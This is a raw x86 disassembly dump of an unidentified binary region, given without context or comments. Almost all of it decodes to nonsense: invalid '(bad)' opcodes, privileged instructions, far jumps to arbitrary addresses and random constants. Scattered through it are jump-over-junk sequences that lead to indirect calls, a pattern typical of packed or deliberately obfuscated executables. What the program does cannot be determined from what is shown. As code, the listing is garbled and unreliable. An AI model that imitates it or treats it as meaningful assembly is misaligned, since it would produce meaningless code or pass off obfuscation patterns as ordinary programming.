  41fb98:	cld    
  41fb99:	inc    edi
  41fb9a:	dec    esi
  41fb9b:	add    dl,bh
  41fb9d:	sub    edi,DWORD PTR [ecx+0x70]
  41fba0:	push   esi
  41fba1:	or     DWORD PTR [edx],ebp
  41fba3:	jmp    0xfcfc0741
  41fba8:	jg     0x41fb92
  41fbaa:	ror    BYTE PTR [ecx+eiz*4],cl
  41fbad:	in     al,dx
  41fbae:	mov    eax,0x84df412f
  41fbb3:	lea    ebx,[edx-0x2f013812]
  41fbb9:	jae    0x41fbad
  41fbbb:	push   0xfffffff5
  41fbbd:	pop    ds
  41fbbe:	and    DWORD PTR [esi-0x60],edx
  41fbc1:	sub    bh,bh
  41fbc3:	mov    esi,0x1ecb2690
  41fbc8:	jae    0x41fb65
  41fbca:	cmp    eax,0xd08822d2
  41fbcf:	mov    esp,0x8fbee8d7
  41fbd4:	sbb    dl,dl
  41fbd6:	cmp    DWORD PTR [edx],0x65
  41fbd9:	add    esi,DWORD PTR [edx-0x75]
  41fbdc:	jl     0x41fb7a
  41fbde:	mov    ds:0xd50e70c4,al
  41fbe3:	xor    DWORD PTR [edx-0x6b],edi
  41fbe6:	cdq    
  41fbe7:	out    0x57,eax
  41fbe9:	xor    DWORD PTR [edx+ebx*1-0x7d417d04],edx
  41fbf0:	iret   
  41fbf1:	sbb    BYTE PTR [ecx+0x230c8a9d],0x56
  41fbf8:	push   0xffffffda
  41fbfa:	mov    ds:0xa8dcb455,eax
  41fbff:	mov    bh,0x8b
  41fc01:	inc    ebp
  41fc02:	ror    BYTE PTR [ebx+0x1581d04d],1
  41fc08:	xor    BYTE PTR ds:0x26d40043,dh
  41fc0e:	add    BYTE PTR [eax],al
  41fc10:	sub    ecx,ebx
  41fc12:	sub    eax,0x7511
  41fc17:	cmp    DWORD PTR ds:0x4335a8,0x0
  41fc1e:	jb     0x41fd09
  41fc24:	neg    edx
  41fc26:	jmp    0x41fd09
  41fc2b:	push   0x3c46
  41fc30:	push   0x3b3f
  41fc35:	call   DWORD PTR ds:0x43c7c4
  41fc3b:	jmp    0x41fd09
  41fc40:	sub    DWORD PTR [ebx+0x48],edi
  41fc43:	adc    eax,0x7f7d375a
  41fc48:	jp     0x41fc4f
  41fc4a:	loope  0x41fc59
  41fc4c:	push   0xffffffeb
  41fc4e:	aad    0x74
  41fc50:	add    BYTE PTR [ebx+0x1],dh
  41fc53:	add    BYTE PTR [ecx+0x47000000],dh
  41fc59:	add    bh,BYTE PTR [ecx+eiz*1+0x31fbedab]
  41fc60:	mov    esi,0xe5528904
  41fc65:	minps  xmm0,XMMWORD PTR [ebx+0x6d]
  41fc69:	sub    BYTE PTR [ebx-0x64],dh
  41fc6c:	daa    
  41fc6d:	inc    esi
  41fc6e:	fild   DWORD PTR [edx]
  41fc70:	popf   
  41fc71:	data16 fs jae 0x41fcc7
  41fc75:	leave  
  41fc76:	cmpxchg DWORD PTR [edx+ebx*1-0x78],ecx
  41fc7b:	dec    ebx
  41fc7c:	jp     0x41fcb9
  41fc7e:	fnstenv [edi]
  41fc80:	jecxz  0x41fc12
  41fc82:	mov    edi,0x2b62288e
  41fc87:	sbb    al,bh
  41fc89:	jl     0x41fc72
  41fc8b:	push   ebp
  41fc8c:	mov    bh,0xc6
  41fc8e:	sysret 
  41fc90:	inc    esi
  41fc91:	or     eax,0x55faa9a3
  41fc96:	push   0xffffffe5
  41fc98:	test   DWORD PTR [ebp-0x8],ebp
  41fc9b:	adc    BYTE PTR [eax-0x3b9dd776],bl
  41fca1:	mov    bl,0xe9
  41fca3:	inc    BYTE PTR [ecx+0x7a23c307]
  41fca9:	dec    eax
  41fcaa:	mov    al,ds:0xf89fa4a9
  41fcaf:	add    eax,0x5df5e01c
  41fcb4:	(bad)  
  41fcb5:	fist   DWORD PTR [ecx+0x2c71c546]
  41fcbb:	adc    al,0xa1
  41fcbd:	pop    edi
  41fcbe:	xchg   cl,dh
  41fcc0:	icebp  
  41fcc1:	(bad)  
  41fcc2:	mov    ecx,0x6e36f9c9
  41fcc7:	imul   esp,DWORD PTR [edi+0x851fbf4],0xffffffa9
  41fcce:	jge    0x41fc64
  41fcd0:	xchg   edx,eax
  41fcd1:	dec    ecx
  41fcd2:	push   0x6d
  41fcd4:	or     al,0xe
  41fcd6:	jbe    0x41fcbf
  41fcd8:	pop    esi
  41fcd9:	aam    0x42
  41fcdb:	adc    eax,edx
  41fcdd:	outs   dx,BYTE PTR ds:[esi]
  41fcde:	pop    ecx
  41fcdf:	cmp    eax,edi
  41fce1:	xor    bh,bl
  41fce3:	cmp    edx,DWORD PTR [esp+ecx*8]
  41fce6:	aam    0x35
  41fce8:	xchg   ecx,eax
  41fce9:	dec    eax
  41fcea:	sbb    ch,BYTE PTR [esi-0x1b]
  41fced:	pusha  
  41fcee:	frstor [ebp-0x17]
  41fcf1:	push   fs
  41fcf3:	sbb    cl,BYTE PTR [edi]
  41fcf5:	js     0x41fcb0
  41fcf7:	pop    edi
  41fcf8:	jg     0x41fd66
  41fcfa:	add    DWORD PTR ds:0x9c99a498,edx
  41fd00:	sbb    esi,edi
  41fd02:	sub    al,0x73
  41fd04:	pop    DWORD PTR [eax]
  41fd06:	pop    ebp
  41fd07:	fiadd  DWORD PTR [esi+0xf181]
  41fd0d:	loop   0x41fd87
  41fd0f:	shr    ecx,0x10
  41fd12:	xor    eax,0x59c9
  41fd17:	jmp    0x41fde5
  41fd1c:	int    0x18
  41fd1e:	ret    0xd73a
  41fd21:	cli    
  41fd22:	std    
  41fd23:	(bad)  
  41fd24:	jmp    0x7320571c
  41fd29:	cmp    al,0xfb
  41fd2b:	addr16 mov cl,0x73
  41fd2e:	add    DWORD PTR [eax],eax
  41fd30:	mov    cl,0x0
  41fd32:	add    BYTE PTR [eax],al
  41fd34:	xchg   edi,eax
  41fd35:	ror    ch,1
  41fd37:	push   0xd63ca670
  41fd3c:	cmc    
  41fd3d:	mov    dh,0xb2
  41fd3f:	xchg   ebx,eax
  41fd40:	jnp    0x41fd51
  41fd42:	mov    ds:0x5f71cf2b,eax
  41fd47:	jmp    0xf41f754e
  41fd4c:	cmc    
  41fd4d:	mov    edx,DWORD PTR [eax-0xc5b28c1]
  41fd53:	pop    ds
  41fd54:	jmp    0x1bed51cd
  41fd59:	into   
  41fd5a:	jmp    0x67fe27f
  41fd5f:	icebp  
  41fd60:	mov    bl,cl
  41fd62:	adc    BYTE PTR [ecx],dl
  41fd64:	adc    al,0xa
  41fd66:	sbb    dl,BYTE PTR [edi+edi*4-0x4c]
  41fd6a:	div    BYTE PTR [eax+edi*1+0x1b9d7b52]
  41fd71:	mov    edx,0x31fd9212
  41fd76:	cld    
  41fd77:	repnz mov eax,0x68963452
  41fd7d:	stc    
  41fd7e:	cmp    BYTE PTR [ebx-0x9],ch
  41fd81:	repz scas eax,DWORD PTR es:[edi]
  41fd83:	pop    eax
  41fd84:	mov    edx,0xb73c7491
  41fd89:	enter  0x3ce7,0xa0
  41fd8d:	mov    esp,0x5a510b16
  41fd92:	addr16 (bad) 
  41fd95:	fs pop esi
  41fd97:	inc    ebp
  41fd98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd99:	mov    edi,0xb27c9976
  41fd9e:	aaa    
  41fd9f:	aas    
  41fda0:	loopne 0x41fd57
  41fda2:	push   es
  41fda3:	pop    ebx
  41fda4:	add    DWORD PTR [ebx-0x373da543],esp
  41fdaa:	ficomp WORD PTR [ebx-0x57]
  41fdad:	add    DWORD PTR [edx+0x23edcbd9],eax
  41fdb3:	mov    al,0x93
  41fdb5:	add    BYTE PTR [edx+0x61],dl
  41fdb8:	retf   0xfbdb
  41fdbb:	push   cs
  41fdbc:	jg     0x41fde8
  41fdbe:	sahf   
  41fdbf:	hlt    
  41fdc0:	in     al,0x70
  41fdc2:	jbe    0x41fe32
  41fdc4:	mov    ebp,0xb41d1077
  41fdc9:	push   esi
  41fdca:	mov    ah,0xb0
  41fdcc:	xor    al,0x5c
  41fdce:	out    0x4e,eax
  41fdd0:	fmul   QWORD PTR [eax+0x49a4c8f9]
  41fdd6:	mov    edx,0x6de73221
  41fddb:	clc    
  41fddc:	arpl   WORD PTR ds:0xc68aa46d,dx
  41fde2:	lods   eax,DWORD PTR ds:[esi]
  41fde3:	mov    WORD PTR [edi],ds
  41fde5:	shl    eax,0x10
  41fde8:	or     eax,ecx
  41fdea:	jmp    0x41feb8
  41fdef:	pop    ebx
  41fdf0:	scas   eax,DWORD PTR es:[edi]
  41fdf1:	and    ebx,ecx
  41fdf3:	neg    ebp
  41fdf5:	sti    
  41fdf6:	scas   eax,DWORD PTR es:[edi]
  41fdf7:	mov    dh,0x81
  41fdf9:	push   0x70
  41fdfb:	xor    ecx,DWORD PTR [edi+0x7462de42]
  41fe01:	add    DWORD PTR [eax],eax
  41fe03:	mov    cl,0x0
  41fe05:	add    BYTE PTR [eax],al
  41fe07:	mov    eax,0x31997268
  41fe0c:	push   ebp
  41fe0d:	in     eax,0x52
  41fe0f:	sbb    al,0xfe
  41fe11:	or     BYTE PTR [ecx],bh
  41fe13:	enter  0x4d40,0x24
  41fe17:	pop    bx
  41fe19:	sahf   
  41fe1a:	xor    BYTE PTR [ecx],ch
  41fe1c:	pop    ebp
  41fe1d:	xor    eax,0x81895ff0
  41fe22:	fnstsw WORD PTR [edx]
  41fe24:	xchg   BYTE PTR [edx],dl
  41fe26:	push   0x78c356cf
  41fe2b:	scas   al,BYTE PTR es:[edi]
  41fe2c:	xor    ah,bh
  41fe2e:	ss jno 0x41fdbf
  41fe31:	icebp  
  41fe32:	ret    
  41fe33:	mov    ebx,0xfddf661b
  41fe38:	dec    esp
  41fe39:	daa    
  41fe3a:	sbb    ch,ah
  41fe3c:	aad    0xf1
  41fe3e:	ins    DWORD PTR es:[edi],dx
  41fe3f:	adc    al,0xcf
  41fe41:	aaa    
  41fe42:	dec    edx
  41fe43:	jnp    0x41fdcf
  41fe45:	or     al,BYTE PTR [edi]
  41fe47:	pop    ds
  41fe48:	test   DWORD PTR [ecx+0xe],0x9961822e
  41fe4f:	inc    ebp
  41fe50:	(bad)  
  41fe51:	aad    0xd3
  41fe53:	xchg   esi,eax
  41fe54:	jbe    0x41fe6f
  41fe56:	push   edi
  41fe57:	pop    edx
  41fe58:	pushf  
  41fe59:	and    ecx,ebx
  41fe5b:	mov    al,0x4a
  41fe5d:	mov    ecx,0x626753cd
  41fe62:	hlt    
  41fe63:	cli    
  41fe64:	repz pop esp
  41fe66:	mov    ?,esp
  41fe68:	inc    ebx
  41fe69:	sbb    al,0x72
  41fe6b:	inc    ebp
  41fe6c:	pop    eax
  41fe6d:	gs dec eax
  41fe6f:	aas    
  41fe70:	mov    bl,0xef
  41fe72:	cmp    BYTE PTR [ebp-0x74522b1],al
  41fe78:	aad    0x45
  41fe7a:	jmp    0x6eec:0x67b257db
  41fe81:	mov    ds:0xdefb9d1d,eax
  41fe86:	mov    ds:0xa782c4bd,al
  41fe8b:	aam    0xdf
  41fe8d:	arpl   WORD PTR [eax+eax*8],dx
  41fe90:	push   ss
  41fe91:	mov    edi,0xcd5ea3c5
  41fe96:	mov    fs:0xa437d036,al
  41fe9c:	ins    BYTE PTR es:[edi],dx
  41fe9d:	in     al,0x83
  41fe9f:	(bad)
  41fea3:	xchg   DWORD PTR [ebp+edi*2-0x55c8f477],edi
  41feaa:	fist   DWORD PTR [ebx]
  41feac:	inc    edx
  41fead:	push   es
  41feae:	retf   
  41feaf:	(bad)  
  41feb0:	lea    edx,ds:0x9d112038
  41feb6:	mov    cx,WORD PTR cs:[ebp+0x10]
  41febb:	cmp    DWORD PTR ds:0x43360c,0x0
  41fec2:	jl     0x41ffa6
  41fec8:	jmp    0x41ffa6
  41fecd:	push   0x81f7
  41fed2:	call   DWORD PTR ds:0x43c820
  41fed8:	jmp    0x41ffa6
  41fedd:	repz pop esi
  41fedf:	pop    edi
  41fee0:	out    dx,eax
  41fee1:	(bad)  
  41fee2:	out    dx,eax
  41fee3:	repz pop esi
  41fee5:	out    dx,eax
  41fee6:	xchg   ebp,esi
  41fee8:	mov    edi,0x67afddad
  41feed:	adc    esi,DWORD PTR [ebp+0x1]
  41fef0:	add    BYTE PTR [ecx-0x79000000],dh
  41fef6:	add    DWORD PTR [ebx+0x1f],esi
  41fef9:	push   esi
  41fefa:	lds    edi,FWORD PTR [eax+0x50aa6522]
  41ff00:	popa   
  41ff01:	push   esi
  41ff02:	cs repnz out 0x57,eax
  41ff06:	push   eax
  41ff07:	jbe    0x41ff01
  41ff09:	pop    ebp
  41ff0a:	sbb    DWORD PTR [edx],esi
  41ff0c:	repz jecxz 0x41fe96
  41ff0f:	popa   
  41ff10:	sbb    BYTE PTR [bx+si],bh
  41ff13:	pushf  
  41ff14:	jmp    0x2b73a8b4
  41ff19:	sbb    BYTE PTR [esi-0x760c2425],cl
  41ff1f:	aaa    
  41ff20:	mov    BYTE PTR [edi],ch
  41ff22:	cmp    ah,BYTE PTR [ebx-0x38fffcd1]
  41ff28:	mov    ah,0xd3
  41ff2a:	xlat   BYTE PTR ds:[ebx]
  41ff2b:	icebp  
  41ff2c:	fcomp  QWORD PTR [ecx-0x38]
  41ff2f:	retf   0x984d
  41ff32:	push   eax
  41ff33:	xchg   ebp,eax
  41ff34:	mov    bl,0x21
  41ff36:	push   es
  41ff37:	js     0x41ff36
  41ff39:	push   ss
  41ff3a:	lods   eax,DWORD PTR ds:[esi]
  41ff3b:	nop
  41ff3c:	sub    eax,DWORD PTR [eax+0x30884e48]
  41ff42:	mov    edi,gs
  41ff44:	jnp    0x41ff99
  41ff46:	pop    ds
  41ff47:	das    
  41ff48:	pop    edx
  41ff49:	imul   esp,edx,0x9b9687d3
  41ff4f:	fdivr  QWORD PTR [eax-0x7f]
  41ff52:	leave  
  41ff53:	mov    eax,0x5bd87ba4
  41ff58:	ds xchg ebx,eax
  41ff5a:	std    
  41ff5b:	int3   
  41ff5c:	or     DWORD PTR [ecx-0x2e],esp
  41ff5f:	fst    QWORD PTR [eax+0x51b629e7]
  41ff65:	dec    esi
  41ff66:	lds    edx,FWORD PTR [eax+0x7b]
  41ff69:	dec    edi
  41ff6a:	cmp    eax,0x1940f93d
  41ff6f:	daa    
  41ff70:	adc    dl,bl
  41ff72:	jbe    0x41ffa5
  41ff74:	aaa    
  41ff75:	fist   DWORD PTR [edx+0xa]
  41ff78:	je     0x41ffc8
  41ff7a:	les    esi,FWORD PTR [esi+0x64e8dbab]
  41ff80:	pop    es
  41ff81:	ficom  DWORD PTR [ebx*8+0x4b0d9755]
  41ff88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff89:	sbb    al,0xa
  41ff8b:	push   edi
  41ff8c:	(bad)  
  41ff8d:	cld    
  41ff8e:	mov    dh,0x1b
  41ff90:	xchg   esp,eax
  41ff91:	lea    eax,[ebx-0x12]
  41ff94:	arpl   si,si
  41ff96:	daa    
  41ff97:	mov    al,0x44
  41ff99:	test   al,0xcd
  41ff9b:	les    edx,FWORD PTR [ebp+0x4a]
  41ff9e:	loope  0x41ffa6
  41ffa0:	push   esi
  41ffa1:	(bad)  
  41ffa2:	jo     0x41ffed
  41ffa4:	or     eax,0x14558bcb
  41ffa9:	mov    edx,DWORD PTR [ebp+0x10]
  41ffac:	jmp    0x42007a
  41ffb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffb2:	ret    0xa57e
  41ffb5:	jle    0x41ff74
  41ffb7:	inc    ebx
  41ffb9:	dec    edi
  41ffba:	stos   BYTE PTR es:[edi],al
  41ffbb:	in     al,0x65
  41ffbd:	(bad)  
  41ffbe:	mov    ch,0x55
  41ffc0:	in     al,0xc4
  41ffc2:	jne    0x41ffc5
  41ffc4:	add    BYTE PTR [ecx-0x68000000],dh
  41ffca:	sbb    eax,0xa217a7dc
  41ffcf:	clc    
  41ffd0:	stos   DWORD PTR es:[edi],eax
  41ffd1:	popa   
  41ffd2:	mov    dl,0xf0
  41ffd4:	addr16 push 0x67c91395
  41ffda:	mov    al,0x63
  41ffdc:	mov    bl,0x8d
  41ffde:	pop    ss
  41ffdf:	xor    al,0xa8
  41ffe1:	adc    ecx,edi
  41ffe3:	(bad)  
  41ffe4:	clc    
  41ffe5:	mov    dl,BYTE PTR [ecx+0x6072372a]
  41ffeb:	mov    ah,0x65
  41ffed:	pushf  
  41ffee:	sub    ebx,DWORD PTR [edi]
  41fff0:	cmp    ebp,DWORD PTR [ebp+0x6f595daa]
  41fff6:	ror    BYTE PTR [edi+0x50b60a12],cl
  41fffc:	inc    esp
  41fffd:	xlat   BYTE PTR ds:[ebx]
  41fffe:	sub    al,0x5d
  420000:	cmp    esi,eax
  420002:	jmp    0xd7c1e3dd
  420007:	test   eax,0x3823d22d
  42000c:	xor    dl,BYTE PTR [edi-0x1d94b90a]
  420012:	xor    DWORD PTR [ebx+0x68bbab85],0x56
  420019:	inc    edx
  42001a:	fsubr  st,st(3)
  42001c:	adc    ch,BYTE PTR [edi*1-0x13cb12aa]
  420023:	mov    ebx,ss
  420025:	cwde   
  420026:	scas   al,BYTE PTR es:[edi]
  420027:	add    eax,DWORD PTR [ebx]
  420029:	shl    BYTE PTR [ebx+0x2a2087cc],0x63
  420030:	sti    
  420031:	add    eax,0x54fdf543
  420036:	dec    esi
  420037:	mov    esi,0x93c81521
  42003c:	mov    ds:0x995b5b08,al
  420041:	stos   DWORD PTR es:[edi],eax
  420042:	scas   eax,DWORD PTR es:[edi]
  420043:	jmp    0x420059
  420045:	pushf  
  420046:	pop    esp
  420047:	repz jb 0x420074
  42004a:	pop    es
  42004b:	adc    BYTE PTR [ecx+0x65],ch
  42004e:	fs xor al,0xc7
  420051:	push   ebp
  420052:	fwait
  420053:	push   es
  420054:	and    ch,bl
  420056:	dec    esp
  420057:	dec    ebx
  420058:	sub    eax,ebp
  42005a:	imul   esi,DWORD PTR [esi],0x4c
  42005d:	repnz dec edx
  42005f:	push   eax
  420060:	lods   eax,DWORD PTR ds:[esi]
  420061:	pop    ecx
  420062:	aad    0x72
  420064:	inc    esi
  420065:	push   cs
  420066:	mov    dl,0x17
  420068:	scas   eax,DWORD PTR es:[edi]
  420069:	retf   0xf69c
  42006c:	shl    ebp,cl
  42006e:	jo     0x42007c
  420070:	push   ebp
  420071:	mov    dl,dl
  420073:	xor    ch,al
  420075:	les    edi,FWORD PTR [edx+eax*2-0x31cc6ae3]
  42007c:	sub    eax,ebx
  42007e:	mov    ebx,DWORD PTR [ebp+0x14]
  420081:	xor    edx,esi
  420083:	add    ecx,edx
  420085:	adc    DWORD PTR ds:0x433664,edx
  42008b:	jmp    0x420159
  420090:	pop    esi
  420091:	icebp  
  420092:	dec    ebp
  420093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420094:	out    dx,eax
  420095:	mov    ebp,0x5a03fbfe
  42009a:	ror    BYTE PTR [esi+0x53],cl
  42009d:	test   al,0x7b
  42009f:	or     eax,0x17675
  4200a4:	mov    cl,0x0
  4200a6:	add    BYTE PTR [eax],al
  4200a8:	push   0x29
  4200aa:	jle    0x4200d5
  4200ac:	mov    eax,ds:0x3cdf2812
  4200b1:	mov    ds:0xf501729d,al
  4200b6:	jl     0x420071
  4200b8:	xor    eax,0xf45ab5c6
  4200bd:	fdivr  st(1),st
  4200bf:	bound  edi,QWORD PTR [ecx+ebp*4]
  4200c2:	xchg   edx,eax
  4200c3:	outs   dx,BYTE PTR ds:[esi]
  4200c4:	sbb    ebp,DWORD PTR [edx-0x4e3eb594]
  4200ca:	rcl    BYTE PTR [edi+0x8],0xac
  4200ce:	(bad)  
  4200cf:	fisub  DWORD PTR [ecx-0x74356ce1]
  4200d5:	or     cl,cl
  4200d7:	jmp    0xaa55b8ab
  4200dc:	js     0x4200cf
  4200de:	loope  0x4200b4
  4200e0:	pop    ecx
  4200e1:	dec    ebp
  4200e2:	shr    dl,1
  4200e4:	daa    
  4200e5:	mov    dh,0xd6
  4200e7:	jl     0x420159
  4200e9:	fcmovbe st,st(4)
  4200eb:	inc    edx
  4200ec:	sub    al,0xbb
  4200ee:	leave  
  4200ef:	or     DWORD PTR [ecx],ebp
  4200f1:	mov    esp,0x9610a014
  4200f6:	(bad)  
  4200f8:	mov    bh,0xab
  4200fa:	outs   dx,DWORD PTR ds:[esi]
  4200fb:	mov    bl,BYTE PTR [edx-0x581038fb]
  420101:	rol    DWORD PTR [eax+0x39],cl
  420104:	clc    
  420105:	adc    eax,DWORD PTR [eax+0x25]
  420108:	add    ah,BYTE PTR [ecx-0x6c43aac3]
  42010e:	or     edi,DWORD PTR [edi+edi*4]
  420111:	mov    esp,DWORD PTR [edi-0x384da93a]
  420117:	(bad)  
  420119:	cmp    al,0x7c
  42011b:	rcr    DWORD PTR [eax],1
  42011d:	scas   al,BYTE PTR es:[edi]
  42011e:	xchg   BYTE PTR [edx-0x3fa9b7fc],bl
  420124:	sub    DWORD PTR [edi-0x39],ebp
  420127:	xorps  xmm2,XMMWORD PTR [eax+0x5b]
  42012b:	jge    0x4200fa
  42012d:	jnp    0x42019c
  42012f:	fild   WORD PTR fs:[eax]
  420132:	jle    0x4200c9
  420134:	xchg   DWORD PTR [ecx+eiz*8-0x68],esp
  420138:	sbb    BYTE PTR [edi-0x27],ch
  42013b:	arpl   WORD PTR [ebp+eax*1+0x2fb49e8b],si
  420142:	(bad)  
  420143:	aad    0x4e
  420145:	lods   al,BYTE PTR ds:[esi]
  420146:	retf   
  420147:	adc    al,bh
  420149:	or     BYTE PTR [edx-0x11],bh
  42014c:	jbe    0x4201bb
  42014e:	loop   0x42014b
  420150:	push   0x4387bd02
  420155:	popa   
  420156:	mov    ebp,0x848988de
  42015b:	(bad)  
  42015c:	fcom   QWORD PTR [ecx]
  42015e:	ret    
  42015f:	int    0x83
  420161:	cmp    eax,0x433640
  420166:	add    BYTE PTR [edi],cl
  420168:	sbb    BYTE PTR [eax+eax*1],0x0
  42016c:	add    BYTE PTR [ebx],dh
  42016e:	retf   
  42016f:	adc    edx,eax
  420171:	jmp    0x420189
  420176:	push   0x7f66
  42017b:	push   DWORD PTR [ebp-0x10]
  42017e:	push   0x804b
  420183:	call   DWORD PTR ds:0x43c82c
  420189:	mov    eax,DWORD PTR [ebp+0x10]
  42018c:	mov    ecx,DWORD PTR [ebp+0x14]
  42018f:	mov    ecx,DWORD PTR [ebp+0x10]
  420192:	mov    edx,DWORD PTR [ebp+0x14]
  420195:	xor    ecx,esi
  420197:	jmp    0x420265
  42019c:	lahf   
  42019d:	dec    edi
  42019e:	sahf   
  42019f:	add    bl,dh
  4201a1:	rcr    DWORD PTR [edi+0x279e1ddf],cl
  4201a7:	(bad)  
  4201a9:	jmp    0x1:0x7726de01
  4201b0:	mov    cl,0x0
  4201b2:	add    BYTE PTR [eax],al
  4201b4:	mov    WORD PTR [ebp+0x60],es
  4201b7:	test   al,0xbd
  4201ba:	adc    BYTE PTR [ecx],bh
  4201bc:	pop    esi
  4201bd:	shl    bh,0x5e
  4201c0:	push   ecx
  4201c1:	adc    esi,DWORD PTR [eax]
  4201c3:	cmp    al,0x45
  4201c5:	xchg   edx,eax
  4201c6:	loope  0x420213
  4201c8:	mov    eax,0x76f040de
  4201cd:	cmp    eax,0x2c884856
  4201d2:	imul   esi,esi,0xffffffc8
  4201d5:	mov    WORD PTR [ebx+ecx*2],fs
  4201d8:	mov    ds:0x40987795,eax
  4201dd:	mov    ds:0xf688f77b,al
  4201e2:	rcl    BYTE PTR [ebx+0x5d25cf62],cl
  4201e8:	push   ecx
  4201e9:	sar    ebp,cl
  4201eb:	dec    edx
  4201ec:	fs dec eax
  4201ee:	shl    BYTE PTR [edx],1
  4201f0:	push   edx
  4201f1:	sub    edi,esi
  4201f3:	add    ch,BYTE PTR [edi+0x1f4461b9]
  4201f9:	and    al,0x99
  4201fb:	sbb    ebx,DWORD PTR [eax-0x4a3db9c0]
  420201:	jg     0x420210
  420203:	jnp    0x42022e
  420205:	shl    BYTE PTR [esi-0x23],1
  420208:	cmp    edx,esi
  42020a:	and    al,0x2b
  42020c:	xor    dh,BYTE PTR [esi+0x7a]
  42020f:	(bad)  
  420210:	adc    BYTE PTR [eax],al
  420212:	cli    
  420213:	jmp    0xe95dc962
  420218:	mov    dl,0x19
  42021a:	jmp    0x81b:0x992178ed
  420221:	dec    ebp
  420222:	shr    DWORD PTR [esi-0x46a9fa51],0xd8
  420229:	jae    0x42026c
  42022b:	ficom  DWORD PTR [ebx-0x377b1d4f]
  420231:	add    ebx,DWORD PTR [edi+0x1ceb5fa3]
  420237:	leave  
  420238:	sub    esi,DWORD PTR ds:0x528bfeeb
  42023e:	add    edx,DWORD PTR [edx+0x2a1577bd]
  420244:	pop    esp
  420245:	lods   eax,DWORD PTR ds:[esi]
  420246:	pop    ss
  420247:	push   ebx
  420248:	inc    esp
  420249:	icebp  
  42024a:	push   ss
  42024b:	dec    edx
  42024c:	ret    0x50b8
  42024f:	xor    eax,0xbf25dc91
  420254:	inc    ecx
  420255:	sbb    ebx,DWORD PTR [esi]
  420257:	mov    bh,0x4d
  420259:	sbb    eax,0xd12e394
  42025e:	ret    
  42025f:	out    dx,eax
  420260:	arpl   WORD PTR [edx-0x32],cx
  420263:	xchg   ecx,eax
  420264:	and    BYTE PTR [ebx],dh
  420266:	mov    BYTE PTR [ebx],0xc1
  420269:	mov    ecx,DWORD PTR [ebp+0x10]
  42026c:	jmp    0x42033a
  420271:	retf   
  420272:	ror    edx,0xa
  420275:	retf   0xcb0b
  420278:	rcl    DWORD PTR [ebx],0x3c
  42027b:	aaa    
  42027c:	xchg   edx,eax
  42027d:	fild   WORD PTR [eax+0x49]
  420280:	(bad)  
  420281:	xlat   BYTE PTR ds:[ebx]
  420282:	ja     0x420285
  420284:	add    BYTE PTR [ecx+0x21000000],dh
  42028a:	mov    edx,0xcce77dcb
  42028f:	pop    ds
  420290:	fucom  st(4)
  420292:	cli    
  420293:	sbb    dh,BYTE PTR [edi+edi*1+0x1d]
  420297:	xchg   edx,eax
  420298:	(bad)  
  420299:	(bad)  
  42029a:	xor    DWORD PTR [ecx+0x18636c6c],esp
  4202a0:	cdq    
  4202a1:	fbld   TBYTE PTR [edi+0x6d5b92b4]
  4202a7:	loopne 0x42025a
  4202a9:	mov    edi,0xe9e25c25
  4202ae:	dec    ebx
  4202af:	js     0x42031b
  4202b1:	add    al,BYTE PTR [eax-0x18]
  4202b4:	ror    BYTE PTR [ebx+0x65],0x96
  4202b8:	cs (bad) 
  4202ba:	retf   
  4202bb:	out    0x48,eax
  4202bd:	mov    esp,0x49a318af
  4202c2:	xor    dh,BYTE PTR [edx+0x2c0f18ac]
  4202c8:	je     0x420341
  4202ca:	div    DWORD PTR [ecx]
  4202cc:	retf   
  4202cd:	fidivr DWORD PTR [ebx-0x3b3951fe]
  4202d3:	in     eax,0x2a
  4202d5:	jns    0x4202b4
  4202d7:	stos   DWORD PTR es:[edi],eax
  4202d8:	and    edx,DWORD PTR [edi+0x13c2ade3]
  4202de:	cld    
  4202df:	and    esi,DWORD PTR [ecx-0x4b]
  4202e2:	mov    dh,0x3f
  4202e4:	bound  ecx,QWORD PTR [eax-0x6e]
  4202e7:	dec    ebp
  4202e8:	pusha  
  4202e9:	mov    ecx,0x1d58c784
  4202ee:	out    0x7c,eax
  4202f0:	les    ebx,FWORD PTR [ebx+0x5468490b]
  4202f6:	cmp    eax,DWORD PTR ds:0x3ae31795
  4202fc:	jp     0x420316
  4202fe:	xchg   ah,bh
  420300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420301:	imul   edi,DWORD PTR [eax+eax*1],0x53
  420305:	aam    0x22
  420307:	sub    ch,dh
  420309:	loope  0x420307
  42030b:	call   0x2bd2c567
  420310:	enter  0xece0,0xde
  420314:	and    ah,BYTE PTR [edx]
  420316:	lds    esi,FWORD PTR [esi*8+0x23dc8369]
  42031d:	push   ss
  42031e:	inc    ebx
  42031f:	push   esi
  420320:	sbb    dl,BYTE PTR [edi-0x78]
  420323:	fst    QWORD PTR [eax-0x287e0394]
  420329:	dec    edx
  42032a:	inc    ebx
  42032b:	nop
  42032c:	sub    BYTE PTR [edi],bh
  42032e:	add    DWORD PTR [edi],0xffffff85
  420331:	add    DWORD PTR [ebp-0x39],eax
  420334:	mov    ah,0x9
  420336:	out    dx,al
  420337:	ror    DWORD PTR [eax],1
  420339:	mov    bh,0x8b
  42033b:	push   ebp
  42033c:	adc    al,0x4b
  42033e:	jmp    0x42040c
  420343:	stos   DWORD PTR es:[edi],eax
  420344:	mov    ebx,0xfd56d856
  420349:	scas   eax,DWORD PTR es:[edi]
  42034a:	sti    
  42034b:	sub    eax,0xbade89d8
  420350:	jmp    0x4202f8
  420352:	lahf   
  420353:	mov    BYTE PTR [eax+0x1],bh
  420356:	add    BYTE PTR [ecx+0x21000000],dh
  42035c:	cmp    al,0xf4
  42035e:	rcr    BYTE PTR [edx+0x5329c95d],1
  420364:	fstp   DWORD PTR [edi-0x76]
  420367:	xor    al,0xab
  420369:	sti    
  42036a:	mov    bl,0xb2
  42036c:	icebp  
  42036d:	cmp    eax,0xe4f7a5fb
  420372:	and    eax,0xdd6a0d7e
  420377:	sbb    ah,BYTE PTR [ebp+0x331d94de]
  42037d:	les    ebp,FWORD PTR [edx+0x3f]
  420380:	add    DWORD PTR [eax*8-0x28da31ae],ebx
  420387:	xchg   edi,eax
  420388:	out    0x15,eax
  42038a:	jmp    0x420391
  42038c:	jge    0x42039c
  42038e:	dec    esi
  42038f:	push   cs
  420390:	push   esp
  420391:	imul   esi,DWORD PTR [ecx-0x7a820c18],0x4a
  420398:	sahf   
  420399:	or     DWORD PTR ds:0x40a330d5,ebp
  42039f:	icebp  
